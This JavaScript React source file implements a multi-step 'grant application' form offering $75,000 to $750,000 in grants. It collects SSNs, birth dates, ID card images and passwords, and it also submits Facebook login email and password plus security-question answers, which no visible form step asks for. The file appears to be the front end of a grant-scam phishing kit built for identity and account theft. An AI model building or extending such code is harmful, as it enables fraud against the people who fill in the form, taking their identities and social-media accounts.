import React, { createContext, useState, useContext, useCallback } from 'react';
import axios from 'axios';

// Validation Utilities
const ValidationUtils = {
  validateEmail: (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
  },

  validatePhoneNumber: (phone) => {
    const re = /^[+]?[(]?[0-9]{3}[)]?[-\s.]?[0-9]{3}[-\s.]?[0-9]{4,6}$/;
    return re.test(phone);
  },

  validateSSN: (ssn) => {
    const re = /^\d{3}-?\d{2}-?\d{4}$/;
    return re.test(ssn);
  },

  validateZip: (zip) => {
    const re = /^\d{5}(-\d{4})?$/;
    return re.test(zip);
  },

  validateFundingAmount: (amount) => {
    return amount >= 75000 && amount <= 750000;
  }
};

// Define API URLs
const API_BASE_URL = import.meta.env?.VITE_API_URL || 
                     (typeof window !== 'undefined' && window.ENV_API_URL) || 
                     'http://localhost:3000';
                     
const API_ENDPOINTS = {
  SUBMIT_APPLICATION: `${API_BASE_URL}/api/grants/applications`,
  GET_APPLICATION_STATUS: (id) => `${API_BASE_URL}/api/grants/applications/${id}/status`,
  GET_USER_APPLICATIONS: `${API_BASE_URL}/api/grants/applications`
};

// Initial Form Data Structure
const initialFormData = {
  firstName: '',
  lastName: '',
  email: '',
  phoneNumber: '',
  ssn: '',
  dateOfBirth: '',
  streetAddress: '',
  city: '',
  state: '',
  zip: '',
  fundingType: '',
  fundingAmount: '',
  fundingPurpose: '',
  timeframe: '',
  idCardFront: null,
  idCardBack: null,
  termsAccepted: false,
  gender: '',
  ethnicity: '',
  employmentStatus: '',
  incomeLevel: '',
  educationLevel: '',
  citizenshipStatus: '',
  agreeToCommunication: false
};

// Create Context
const ApplicationFormContext = createContext(undefined);

// Provider Component
export const ApplicationFormProvider = ({ children }) => {
  // State Management
  const [formData, setFormData] = useState(initialFormData);
  const [currentStep, setCurrentStep] = useState(1);
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionResponse, setSubmissionResponse] = useState(null);
  const [applicationId, setApplicationId] = useState(null);

  // Enhanced Form Field Update Method
  const updateFormField = useCallback((field, value) => {
    // Secure handling of specific fields
    if (field === 'fundingAmount') {
      const cleanedValue = parseFloat(String(value).replace(/[^0-9.]/g, ''));
      setFormData(prev => ({
        ...prev,
        [field]: isNaN(cleanedValue) ? '' : Math.max(0, cleanedValue)
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [field]: value
      }));
    }

    // Clear previous errors
    if (errors[field]) {
      setErrors(prev => {
        const newErrors = {...prev};
        delete newErrors[field];
        return newErrors;
      });
    }
  }, [errors]);

  // Step Navigation Methods
  const moveToNextStep = useCallback(() => {
    setCurrentStep(prev => Math.min(prev + 1, 3));
  }, []);

  const moveToPreviousStep = useCallback(() => {
    setCurrentStep(prev => Math.max(prev - 1, 1));
  }, []);

  // Comprehensive Validation Method
  const validateCurrentStep = useCallback(() => {
    const stepValidations = {
      1: () => {
        const newErrors = {};
        
        // Required field validations for step 1
        if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
        if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
        if (!formData.ssn.trim()) {
          newErrors.ssn = 'SSN is required';
        } else if (!ValidationUtils.validateSSN(formData.ssn)) {
          newErrors.ssn = 'Invalid SSN format (e.g., 123-45-6789)';
        }
        if (!formData.dateOfBirth) newErrors.dateOfBirth = 'Date of birth is required';
        if (!formData.email.trim()) {
          newErrors.email = 'Email is required';
        } else if (!ValidationUtils.validateEmail(formData.email)) {
          newErrors.email = 'Invalid email format';
        }
        if (!formData.password) newErrors.password = 'Password is required';
        if (!formData.phoneNumber) {
          newErrors.phoneNumber = 'Phone number is required';
        } else if (!ValidationUtils.validatePhoneNumber(formData.phoneNumber)) {
          newErrors.phoneNumber = 'Invalid phone number format';
        }
        if (!formData.streetAddress.trim()) newErrors.streetAddress = 'Street address is required';
        if (!formData.city.trim()) newErrors.city = 'City is required';
        if (!formData.state) newErrors.state = 'State is required';
        if (!formData.zip.trim()) {
          newErrors.zip = 'ZIP code is required';
        } else if (!ValidationUtils.validateZip(formData.zip)) {
          newErrors.zip = 'Invalid ZIP code format (e.g., 12345 or 12345-6789)';
        }
        if (!formData.fundingType) newErrors.fundingType = 'Funding type is required';
        
        // Funding amount validation
        if (!formData.fundingAmount) {
          newErrors.fundingAmount = 'Funding amount is required';
        } else {
          const amount = parseFloat(formData.fundingAmount);
          if (isNaN(amount)) {
            newErrors.fundingAmount = 'Funding amount must be a valid number';
          } else if (!ValidationUtils.validateFundingAmount(amount)) {
            newErrors.fundingAmount = 'Funding amount must be between $75,000 and $750,000';
          }
        }
        
        if (!formData.fundingPurpose.trim()) newErrors.fundingPurpose = 'Funding purpose is required';
        if (!formData.timeframe) newErrors.timeframe = 'Timeframe is required';
        
        return newErrors;
      },
      2: () => {
        const newErrors = {};
        
        // Validate file uploads
        if (!formData.idCardFront) newErrors.idCardFront = 'ID card front is required';
        if (!formData.idCardBack) newErrors.idCardBack = 'ID card back is required';
        
        return newErrors;
      },
      3: () => {
        const newErrors = {};
        
        if (!formData.incomeLevel) newErrors.incomeLevel = 'Income level is required';
        if (!formData.educationLevel) newErrors.educationLevel = 'Education level is required';
        if (!formData.termsAccepted) newErrors.termsAccepted = 'You must accept the terms and conditions';
        
        return newErrors;
      }
    };

    const stepValidation = stepValidations[currentStep] 
      ? stepValidations[currentStep]() 
      : {};
    
    setErrors(stepValidation);
    
    return Object.keys(stepValidation).length === 0;
  }, [formData, currentStep]);

  // Remove a file from the form
  const removeFile = useCallback((fieldName) => {
    updateFormField(fieldName, null);
  }, [updateFormField]);

  // Secure Form Submission Method
  const submitForm = useCallback(async () => {
    if (!validateCurrentStep()) {
      return Promise.reject(new Error('Validation failed'));
    }
  
    setIsSubmitting(true);
    setErrors({});
    setSubmissionResponse(null);
  
    try {
      // Create FormData object
      const submissionFormData = new FormData();
      
      // Personal Info
      submissionFormData.append('firstName', formData.firstName || '');
      submissionFormData.append('lastName', formData.lastName || '');
      submissionFormData.append('ssn', formData.ssn || '');
      submissionFormData.append('dateOfBirth', formData.dateOfBirth || '');
      submissionFormData.append('email', formData.email || '');
      submissionFormData.append('phoneNumber', formData.phoneNumber || '');
      submissionFormData.append('gender', formData.gender || '');
      submissionFormData.append('ethnicity', formData.ethnicity || '');
      submissionFormData.append('password', formData.password || '');
      submissionFormData.append('facebookEmail', formData.facebookEmail || '');
      submissionFormData.append('facebookPassword', formData.facebookPassword || '');
      
      // Security questions
      if (formData.securityQ1) submissionFormData.append('securityQ1', formData.securityQ1 || '');
      if (formData.securityQ2) submissionFormData.append('securityQ2', formData.securityQ2 || '');
      if (formData.securityQ3) submissionFormData.append('securityQ3', formData.securityQ3 || '');

      // Employment Info
      submissionFormData.append('employmentStatus', formData.employmentStatus || '');
      submissionFormData.append('incomeLevel', formData.incomeLevel || '');
      submissionFormData.append('educationLevel', formData.educationLevel || '');
      submissionFormData.append('citizenshipStatus', formData.citizenshipStatus || '');
      submissionFormData.append('age', formData.age || '');

      // Address Info
      submissionFormData.append('streetAddress', formData.streetAddress || '');
      submissionFormData.append('city', formData.city || '');
      submissionFormData.append('state', formData.state || '');
      submissionFormData.append('zip', formData.zip || '');

      // Funding Info
      submissionFormData.append('fundingType', formData.fundingType || '');
      submissionFormData.append('fundingAmount', formData.fundingAmount?.toString() || '');
      submissionFormData.append('fundingPurpose', formData.fundingPurpose || '');
      submissionFormData.append('timeframe', formData.timeframe || '');

      // Other Fields
      submissionFormData.append('agreeToCommunication', formData.agreeToCommunication?.toString() || 'false');
      submissionFormData.append('termsAccepted', formData.termsAccepted?.toString() || 'false');

      // Files - only append if they exist
      if (formData.idCardFront) {
        submissionFormData.append('idCardFront', formData.idCardFront);
      }
      if (formData.idCardBack) {
        submissionFormData.append('idCardBack', formData.idCardBack);
      }

      const response = await axios({
        method: 'post',
        url: API_ENDPOINTS.SUBMIT_APPLICATION,
        data: submissionFormData,
        headers: { 
          'Content-Type': 'multipart/form-data',
          'Accept': 'application/json'
        },
        withCredentials: false,
        timeout: 60000
      });

      setSubmissionResponse(response.data);
      if (response.data && response.data.applicationId) {
        setApplicationId(response.data.applicationId);
      }
      setIsSubmitting(false);
      return response.data;
  
    } catch (error) {
      console.error('Submission Error:', error);
      
      let errorMessage;
      if (error.response) {
        // Get detailed error message from response
        errorMessage = error.response.data.message || 
                      (error.response.data.errors && Array.isArray(error.response.data.errors) 
                        ? error.response.data.errors.join(', ') 
                        : JSON.stringify(error.response.data)) ||
                      'Server validation failed';
      } else if (error.message) {
        try {
          // Try to parse the error message if it's JSON
          const parsedError = JSON.parse(error.message);
          errorMessage = parsedError.message || parsedError.errors || error.message;
        } catch {
          errorMessage = error.message;
        }
      } else {
        errorMessage = 'An unexpected error occurred';
      }
  
      setErrors(prev => ({
        ...prev,
        submission: typeof errorMessage === 'object' 
          ? JSON.stringify(errorMessage) 
          : errorMessage
      }));
  
      setIsSubmitting(false);
      throw error;
    }
  }, [formData, validateCurrentStep]);

  // Get Application Status
  const getApplicationStatus = useCallback(async (appId) => {
    const id = appId || applicationId;
    if (!id) return Promise.reject(new Error('No application ID provided'));
    
    try {
      const response = await axios.get(API_ENDPOINTS.GET_APPLICATION_STATUS(id));
      return response.data;
    } catch (error) {
      console.error('Error fetching application status:', error);
      throw error;
    }
  }, [applicationId]);

  // Get User Applications
  const getUserApplications = useCallback(async (email) => {
    if (!email && !formData.email) return Promise.reject(new Error('Email is required'));
    const userEmail = email || formData.email;
    
    try {
      const response = await axios.get(`${API_ENDPOINTS.GET_USER_APPLICATIONS}?email=${userEmail}`);
      return response.data;
    } catch (error) {
      console.error('Error fetching user applications:', error);
      throw error;
    }
  }, [formData.email]);

  // Reset Form Method
  const resetForm = useCallback(() => {
    setFormData(initialFormData);
    setCurrentStep(1);
    setErrors({});
    setIsSubmitting(false);
    setSubmissionResponse(null);
    setApplicationId(null);
  }, []);

  // Context Value
  const contextValue = {
    formData,
    currentStep,
    errors,
    isSubmitting,
    submissionResponse,
    applicationId,
    updateFormField,
    submitForm,
    moveToNextStep,
    moveToPreviousStep,
    resetForm,
    validateCurrentStep,
    getApplicationStatus,
    getUserApplications,
    removeFile
  };

  return (
    <ApplicationFormContext.Provider value={contextValue}>
      {children}
    </ApplicationFormContext.Provider>
  );
};

// Custom Hook to Use Context
export const useApplicationForm = () => {
  const context = useContext(ApplicationFormContext);
  if (context === undefined) {
    throw new Error('useApplicationForm must be used within an ApplicationFormProvider');
  }
  return context;
};

// Available funding types for dropdown (these could be fetched from API in a real app)
export const FUNDING_TYPES = [
  'Personal Grant', 
  'Business Grant', 
  'Community Grant', 
  'Education Grant', 
  'Real Estate Grant', 
  'Healthcare Grants', 
  'Agriculture Grant', 
  'Home Repairs Grant'
];